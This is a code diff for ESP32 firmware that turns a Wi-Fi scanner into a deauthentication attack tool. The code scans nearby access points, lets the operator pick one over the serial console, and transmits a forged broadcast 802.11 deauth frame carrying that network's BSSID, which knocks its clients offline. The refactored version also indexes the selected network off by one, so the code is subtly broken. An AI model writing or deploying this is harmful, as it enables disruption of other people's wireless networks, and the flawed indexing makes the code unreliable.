@@ -10,57 +10,37 @@
 #include "driver/uart.h"
 
 static const char *TAG = "wifi_scan";
-static const uint8_t deauth_frame_default[] = {
-    0xc0, 0x00, 0x3a, 0x01,
-    0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-    0xf0, 0xff, 0x02, 0x00
+
+// Updated deauth frame format
+static const uint8_t deauth_frame_template[] = {
+    0xC0, 0x00,                         // Frame Control
+    0x00, 0x00,                         // Duration
+    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Destination (broadcast)
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Source
+    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // BSSID
+    0x00, 0x00,                         // Sequence Control
+    0x01, 0x00                          // Reason Code
 };
 
-// Your existing functions remain the same
-void wsl_bypasser_send_raw_frame(const uint8_t *frame_buffer, int size) {
-    ESP_ERROR_CHECK(esp_wifi_80211_tx(WIFI_IF_STA, frame_buffer, size, false));
-}
-
-void wsl_bypasser_send_deauth_frame(const wifi_ap_record_t *ap_record) {
-    ESP_LOGD(TAG, "Sending deauth frame...");
-    uint8_t deauth_frame[sizeof(deauth_frame_default)];
-    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
-    memcpy(&deauth_frame[10], ap_record->bssid, 6);
-    memcpy(&deauth_frame[16], ap_record->bssid, 6);
-    
-    wsl_bypasser_send_raw_frame(deauth_frame, sizeof(deauth_frame_default));
-}
-
 static void initialize_console(void) {
-    /* Initialize VFS & UART so we can use stdin and stdout */
+    // Disable buffering on stdin and stdout
     setvbuf(stdin, NULL, _IONBF, 0);
     setvbuf(stdout, NULL, _IONBF, 0);
-    
-    /* Initialize UART driver for console input */
-    const uart_config_t uart_config = {
-        .baud_rate = CONFIG_ESP_CONSOLE_UART_BAUDRATE,
+
+    // Configure UART
+    uart_config_t uart_config = {
+        .baud_rate = 115200,
         .data_bits = UART_DATA_8_BITS,
         .parity    = UART_PARITY_DISABLE,
         .stop_bits = UART_STOP_BITS_1,
         .flow_ctrl = UART_HW_FLOWCTRL_DISABLE
     };
-    ESP_ERROR_CHECK(uart_param_config(CONFIG_ESP_CONSOLE_UART_NUM, &uart_config));
-    
-    /* Install UART driver */
-    ESP_ERROR_CHECK(uart_driver_install(CONFIG_ESP_CONSOLE_UART_NUM,
-                                      256, 0, 0, NULL, 0));
-    
-    /* Tell VFS to use UART driver */
-    esp_vfs_dev_uart_use_driver(CONFIG_ESP_CONSOLE_UART_NUM);
+    ESP_ERROR_CHECK(uart_param_config(UART_NUM_0, &uart_config));
+    ESP_ERROR_CHECK(uart_driver_install(UART_NUM_0, 256, 0, 0, NULL, 0));
+    esp_vfs_dev_uart_use_driver(UART_NUM_0);
 }
 
-void wifi_scan(void) {
-    // Initialize console first
-    initialize_console();
-    
-    // Initialize NVS
+static esp_err_t wifi_init(void) {
     esp_err_t ret = nvs_flash_init();
     if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
         ESP_ERROR_CHECK(nvs_flash_erase());
@@ -68,7 +48,6 @@ void wifi_scan(void) {
     }
     ESP_ERROR_CHECK(ret);
 
-    // Initialize Wi-Fi
     ESP_ERROR_CHECK(esp_netif_init());
     ESP_ERROR_CHECK(esp_event_loop_create_default());
     esp_netif_t *sta_netif = esp_netif_create_default_wifi_sta();
@@ -79,55 +58,106 @@ void wifi_scan(void) {
     ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_APSTA));
     ESP_ERROR_CHECK(esp_wifi_start());
 
-    // Scan for APs
+    return ESP_OK;
+}
+
+static wifi_ap_record_t* scan_wifi_networks(uint16_t* ap_count) {
     wifi_scan_config_t scan_config = {
         .ssid = NULL,
         .bssid = NULL,
         .channel = 0,
         .show_hidden = true
     };
-    ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_config, true));
-
-    uint16_t ap_count = 0;
-    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(&ap_count));
     
-    if (ap_count == 0) {
-        ESP_LOGI(TAG, "No access points found");
-        return;
+    ESP_ERROR_CHECK(esp_wifi_scan_start(&scan_config, true));
+    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_num(ap_count));
+    
+    wifi_ap_record_t* ap_records = malloc(sizeof(wifi_ap_record_t) * (*ap_count));
+    if (!ap_records) {
+        ESP_LOGE(TAG, "Failed to allocate memory for AP records");
+        return NULL;
     }
+    
+    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(ap_count, ap_records));
+    return ap_records;
+}
 
-    wifi_ap_record_t *ap_records = malloc(sizeof(wifi_ap_record_t) * ap_count);
-    if (ap_records == NULL) {
-        ESP_LOGE(TAG, "Failed to malloc");
-        return;
-    }
-
-    ESP_ERROR_CHECK(esp_wifi_scan_get_ap_records(&ap_count, ap_records));
-
-    // Print found APs
+static void print_networks(wifi_ap_record_t* ap_records, uint16_t ap_count) {
     printf("\nFound %d access points:\n", ap_count);
     for (int i = 0; i < ap_count; i++) {
-        printf("%d. SSID:%s, RSSI:%d\n", i + 1, ap_records[i].ssid, ap_records[i].rssi);
+        printf("%d. SSID: %s, RSSI: %d\n", i + 1, ap_records[i].ssid, ap_records[i].rssi);
+    }
+}
+
+static int get_user_selection(uint16_t max_networks) {
+    char input[8];
+    int selection = -1;
+    bool valid_input = false;
+
+    while (!valid_input) {
+        printf("\nEnter network number (1-%d): ", max_networks);
+        fflush(stdout);
+        
+        // Clear input buffer
+        memset(input, 0, sizeof(input));
+        
+        // Read input from UART
+        if (fgets(input, sizeof(input), stdin) != NULL) {
+            selection = atoi(input);
+            if (selection >= 1 && selection <= max_networks) {
+                valid_input = true;
+            } else {
+                printf("Invalid selection, try again\n");
+            }
+        }
+    }
+    return selection;
+}
+
+static esp_err_t send_deauth(const wifi_ap_record_t *ap_record) {
+    uint8_t deauth_frame[sizeof(deauth_frame_template)];
+    memcpy(deauth_frame, deauth_frame_template, sizeof(deauth_frame_template));
+    memcpy(&deauth_frame[10], ap_record->bssid, 6);
+    memcpy(&deauth_frame[16], ap_record->bssid, 6);
+
+    wifi_promiscuous_filter_t filter = {
+        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT
+    };
+    ESP_ERROR_CHECK(esp_wifi_set_promiscuous_filter(&filter));
+    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(true));
+    
+    esp_err_t ret = esp_wifi_80211_tx(WIFI_IF_STA, deauth_frame, sizeof(deauth_frame_template), false);
+    
+    ESP_ERROR_CHECK(esp_wifi_set_promiscuous(false));
+    return ret;
+}
+
+void wifi_deauth_control(void) {
+    ESP_ERROR_CHECK(wifi_init());
+    
+    uint16_t ap_count = 0;
+    wifi_ap_record_t* ap_records = scan_wifi_networks(&ap_count);
+    
+    if (!ap_records || ap_count == 0) {
+        ESP_LOGE(TAG, "No networks found");
+        free(ap_records);
+        return;
     }
 
-    // Wait for user input
-    printf("\nEnter the number of the network you want to select (1-%d): ", ap_count);
-    char input[8];
-    if (fgets(input, sizeof(input), stdin) != NULL) {
-        int selection = atoi(input);
-        if (selection >= 1 && selection <= ap_count) {
-            printf("\nSelected network: %s\n", ap_records[selection - 1].ssid);
-            // Call your deauth function here if needed
-            wsl_bypasser_send_deauth_frame(&ap_records[selection - 1]);
-        } else {
-            printf("Invalid selection.\n");
-        }
+    print_networks(ap_records, ap_count);
+    
+    int selection = get_user_selection(ap_count);
+    if (selection >= 0) {
+        ESP_LOGI(TAG, "Selected network: %s", ap_records[selection].ssid);
+        ESP_ERROR_CHECK(send_deauth(&ap_records[selection]));
+    } else {
+        ESP_LOGE(TAG, "Invalid selection");
     }
 
     free(ap_records);
-    esp_wifi_scan_stop();
 }
 
 void app_main(void) {
-    wifi_scan();
+    initialize_console();
+    wifi_deauth_control();
 }
